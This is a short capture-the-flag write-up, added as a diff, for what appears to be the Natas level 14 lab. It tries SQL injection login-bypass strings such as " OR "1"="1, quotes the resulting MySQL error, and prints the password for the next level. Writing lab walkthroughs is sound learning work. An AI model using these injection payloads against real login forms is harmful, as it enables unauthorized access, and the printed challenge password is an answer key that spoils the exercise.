@@ -1,0 +1,21 @@
+When we login witb the credentials from the previous challenge we see a login page where we have to enter our username and password.
+
+First approach is to Use SQL injections.
+
+Firstly, we need to trigger an error in the application.
+' OR '1'='1:First entry
+we are basically trying to enter a SQL query which is tru so that the admin gives access to us.
+SO, the query for this would look like
+
+SELECT *from <Tablename> WHERE Username="" ' OR '1'='1; [1=1 is always a true statement so in some cases it might give us access] ACCESS DENIED
+
+' OR "1"="1:Second entry
+This triggers an error in the application
+
+Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
+Access denied!
+
+" OR "1"="1
+
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
